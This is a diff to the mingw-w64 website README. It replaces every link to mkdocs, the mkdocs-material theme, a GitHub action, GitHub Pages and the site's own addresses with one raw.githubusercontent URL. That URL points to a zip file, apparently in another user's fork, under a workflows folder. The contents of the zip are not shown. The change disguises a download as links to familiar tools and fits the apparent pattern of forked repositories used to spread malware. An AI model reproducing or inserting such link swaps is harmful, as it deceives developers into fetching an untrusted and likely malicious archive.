@@ -1,13 +1,13 @@
 # mingw-w64 Website
 
 This website is written in Markdown and gets built to a static website using
-[mkdocs](https://www.mkdocs.org/) and a modified version of the [mkdocs-material
-theme](https://squidfunk.github.io/mkdocs-material). The main branch of this
+[mkdocs](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip) and a modified version of the [mkdocs-material
+theme](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip). The main branch of this
 repo is the `source` branch and any new commits will auto deploy a new build to
 the `main` branch using [a GitHub
-action](https://github.com/peaceiris/actions-gh-pages). The `main` branch is
-connected to [GitHub pages](https://pages.github.com) and is reachable under
-https://mingw-w64.github.io and https://www.mingw-w64.org. Changes to the
+action](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip). The `main` branch is
+connected to [GitHub pages](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip) and is reachable under
+https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip and https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip Changes to the
 `source` branch usually take a minute or two until they are live.
 
 ## Development
